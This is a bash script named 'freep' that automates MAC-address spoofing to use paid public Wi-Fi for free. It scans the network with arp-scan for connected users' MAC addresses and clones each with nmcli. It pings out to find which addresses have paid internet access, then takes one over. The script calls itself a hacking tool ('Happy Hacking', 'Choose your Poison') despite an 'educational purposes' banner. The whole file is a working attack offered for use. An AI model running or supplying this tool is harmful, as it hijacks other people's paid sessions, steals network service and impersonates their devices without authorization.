#! /bin/bash
#__author__ : @yadaOx1
#__version__: 1.0.0
#__description__: automated interent mac spoofer
#__support__ : @yadaOx1
#__changelog__: Available
#
#__version__: 1.0.0
#
#Program Variables

red='\033[1;31m'
Yellow='\033[1;33m'
blue='\033[7;34m'
export purple='\033[1;35m'
reset='\033[0m'
export purple_panda='\033[6;35m'
online='online_users.txt'  #target alian
total_users='allusers.txt' #alian populus
complete_users='users.txt' #alian clan
config_path='/tmp/freep'
previous_config_path='/tmp/freep/freepcollections'
card_config='802-11-wireless.cloned-mac-address'

function drowsy_1 {
    local drunk=$1
    sleep ${drunk} 
}

function banner {
  local epic=$1
  local epic_say=$2
echo -e ${epic}"
                    |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
█▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
█▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
                    |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█"${reset}
        echo "							"
        echo -e ${Yellow} "$epic_say "${reset}
        echo -e ${blue}"＊${reset}.${purple_panda} ᐅᐅ"${reset}
}

epic="$purple_panda"
banner "$epic" " * * * Loading.. * * *"

#Temp file management 
timestep=1
timestump=2
timeduck=3
timeleap=5
if [[ -d $config_path ]]; then
	echo -e "[✔] ${Yellow} located alien spacecship....${reset}"
	drowsy_1 "$timestep"
	if [[ -f $config_path/$total_users ]]; then
		echo -e "[✔] ${Yellow} found and destroyed alien populus.. ${reset}"
		find "$config_path/$total_users" -type f -name "$total_users" -delete
		drowsy_1 "$timestep"
	else
		echo -e "[＊]${Yellow} alien populus not in sight ${reset}"
		drowsy_1 "$timestep"
	fi
	if [[ -f $config_path/$complete_users ]]; then
		echo -e "[✔] ${Yellow} found and destroyed alien clans.. ${reset}"
		find "$config_path/$complete_users" -type f  -name "$complete_users" -delete
		drowsy_1 "$timestep"
	else
		echo -e "[＊]${Yellow} alien clans not in sight ${reset}"
	fi
	if [[ -f $config_path/$online ]]; then
		echo -e "[✔] ${Yellow} acquired target alien... ${reset}"
		cat "$config_path/$online" >> $previous_config_path/$online
		find "$config_path/$online" -type f -name "$online" -delete
		drowsy_1 "$timestep"
	else
		echo -e "[＊]${Yellow} target alien not found ${reset}"
	fi
else
	mkdir {"$config_path/","$previous_config_path/"}
	echo -e "${Yellow} ..Initialised configuration files ${reset}"
	drowsy_1 "$timestep"
	clear
fi

#functions
get_interface(){
	interface=$(iw dev | awk '$1=="Interface"{print $2}') 
}
disable_wifi_iface(){
	nmcli radio wifi off  #sudo ifconfig $interface down
}
enable_wifi_iface(){
	nmcli radio wifi on   #sudo ifconfig $interface up
}
select_point(){
	if [[ -f $previous_config_path/$online ]]; then
		output=$(cat $previous_config_path/$online | fzf)
		get_interface
		echo -e "${Yellow} Enter the public paid wifi name....${reset}"
    		read wifiname_1
		nmcli connection modify "${wifiname_1}" $card_config "$output" &>/dev/null
		disable_wifi_iface
		drowsy_1 "$timestump"
		enable_wifi_iface
		echo -e "[✔] ${Yellow} Happy Hacking ${reset}"
	else
		echo -e "[◉] ${Yellow} target alien not found consider scanning ${reset}"
	fi
}
select_custom(){
	echo -e "${Yellow} Enter custom path to mac address list Format(xx:xx:xx:xx:xx)-list Format /path/to/list -path....${reset}"
	read path
	echo -e "${Yellow} Enter Wifiname....${reset}"
	read wifiname_1
	while IFS= read -r user
	do
		get_interface
		nmcli connection modify "${wifiname_1}" $card_config "$user" &>/dev/null
		drowsy_1 "$timeduck"
		nmcli connection up "${wifiname_1}"
		drowsy_1 "$timeleap"
		Routing_to=$(ip route show default | awk '/default/ {print $3}')
		echo -e "${purple} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${purple} $Routing_to ${reset}"
		net=www.google.com
		result=$(ping -c 3 "$net" > /dev/null && echo "Connected" || echo "Not Connected")
		if [ "$result" = "Connected" ]; then
			echo -e "${Yellow} [✔] ${reset} ${purple} Internet available ${reset}"
			echo "$user" >> $config_path/$online
		else
			echo -e "${purple}[${reset}${red}＊${reset}${purple}]${reset} ${red} No internet conections ${reset}"
		fi
	done < "$path"
}

wifi_spoof_tool(){
	echo -e "${Yellow} Enter the public paid wifi name....${reset}"
	read wifiname_1
	nmcli d wifi connect "${wifiname_1}" &> /dev/null
	drowsy_1 "$timeleap"
	sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> $config_path/$total_users
	tail -n +4 $config_path/$total_users >> $config_path/$complete_users
	tots=$(wc -l $config_path/$complete_users | awk '{print $1}')
	echo -e "${Yellow} $tots users connected to network ${reset}"
	input="$config_path/$complete_users"
	while IFS= read -r user
	do
		get_interface
		nmcli connection modify "${wifiname_1}" $card_config "$user" &>/dev/null
		drowsy_1 "$timeduck"
		disable_wifi_iface
		enable_wifi_iface
		drowsy_1 "$timeduck"
		nmcli d wifi connect "${wifiname_1}" &>/dev/null
		drowsy_1 "$timeleap"
		Routing_to=$(ip route show default | awk '/default/ {print $3}')
		echo -e "${purple} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${purple} $Routing_to ${reset}"
		net=www.google.com
		result=$(ping -c 3 "$net" > /dev/null && echo "Connected" || echo "Not Connected")
		if [ "$result" = "Connected" ]; then
			echo -e "${Yellow} [✔] ${reset} ${purple} Internet available ${reset}"
			echo "$user" >> $config_path/$online
		else
			echo -e "${purple}[${reset}${red}＊${reset}${purple}]${reset} ${red} No internet conections ${reset}"
		fi
	done < "$input"
	echo -e "${Yellow} Would you like 2 set a live user from scanned [y/n] ${reset}"
	read response_2
	if [[ "$response_2" == "y" || "yes" || "Y" || "Yes" || "YES" ]]; then
		if [[ -f $config_path/$online ]]; then
			output=$(cat $config_path/$online | fzf)
			get_interface
			nmcli connection modify "${wifiname_1}" $card_config "$user" &>/dev/null
			drowsy_1 "$timeduck"
			disable_wifi_iface
			enable_wifi_iface
			drowsy_1 "$timeduck"
			nmcli d wifi connect "${wifiname_1}" &>/dev/null
			echo -e "[✔] ${Yellow} Happy hacking if successfull ${reset}"
		else
			echo -e "[◉] ${Yellow} No live Users.. Heading to Storage"
			drowsy_1 "$timeduck"
			select_point
		fi
	else
		exit
	fi
}
clear
epic="$purple"
banner "$epic" "© Yada 2023 --Made with Love For Educational Purposes" 
cat << EOF
Choose your Poison:
    1. Scan for live internet user
    2. Select live user from file
    3. Remove all alien life
    4. Custom file list
    0. Quit
EOF
echo -n 'Enter selection [0-quit]: '
read -r poison

case $poison in
	0) echo "Program terminated.";;
	1) wifi_spoof_tool ;;
	2) select_point ;;
	3)
		rm -rf /tmp/freep ;;
	4) select_custom ;;
	*)
		echo "Invalid entry." >&2
		exit 1
esac
